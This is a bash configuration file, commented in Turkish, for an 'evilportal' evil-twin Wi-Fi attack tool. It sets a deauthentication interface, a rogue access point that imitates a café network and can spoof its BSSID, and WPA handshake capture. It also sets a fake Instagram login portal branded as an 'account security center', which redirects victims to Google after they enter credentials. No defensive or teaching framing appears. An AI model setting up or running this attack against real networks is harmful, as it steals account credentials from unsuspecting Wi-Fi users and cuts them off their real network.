#!/usr/bin/env bash
# ==============================================================
#  evilportal — yapılandırma
#  Tüm ayarlar burada. setup.sh bu dosyayı source eder.
# ==============================================================

# ---------- Arayüzler -----------------------------------------
MON_IF="wlan0"            # monitor mode arayüzü (deauth)
AP_IF="wlan1"             # sahte AP arayüzü (ikinci adaptör)
UPLINK_IF=""              # internet veren arayüz; boşsa otomatik bulunur
SINGLE_ADAPTER=0          # 1 = tek adaptör (AP + sanal monitor vif)
MON_VIF="evilmon"         # tek adaptör modunda oluşturulan sanal vif
SPOOF_BSSID=0             # 1 = sahte AP'nin MAC'i TARGET_BSSID ile aynı olsun.
                          # Gerçek AP hâlâ güçlü/yakınsa aynı BSSID çakışması
                          # istemcilerde bağlantı hatasına yol açabilir — sadece
                          # gerçek AP'yi güvenilir şekilde susturabiliyorsan aç.

# ---------- Hedef ---------------------------------------------
TARGET_SSID="KafeWiFi"                    # gerçek ağın SSID'si
TARGET_BSSID="AA:BB:CC:DD:EE:FF"          # gerçek AP'nin BSSID'si
CHANNEL=6                                  # gerçek ağın kanalı

# Hedef WPA2-PSK ise ve parolasını BİLİYORSAN buraya yaz.
# Boş bırakılırsa ağ "açık" (open) olarak yayınlanır.
WPA_PASS=""

# ---------- Ağ -------------------------------------------------
GATEWAY_IP="10.0.0.1"
SUBNET_MASK="24"
DHCP_START="10.0.0.10"
DHCP_END="10.0.0.100"
DHCP_LEASE="12h"
PORTAL_PORT=80
# Yetkili istemciler için yerel çözümleyici portu (53 dışında olmalı)
AUTH_DNS_PORT=5399

# Doğrulama sonrası gerçek internet verilsin mi?
SHARE_INTERNET=1

# ---------- Portal içeriği ------------------------------------
# Portal sayfası: "instagram" | "verify"
PORTAL_TEMPLATE="instagram"
BRAND="Hesap Güvenliği Merkezi"
SUCCESS_URL="https://www.google.com"

# ---------- Handshake yakalama ---------------------------------
CAPTURE_TIMEOUT="60"
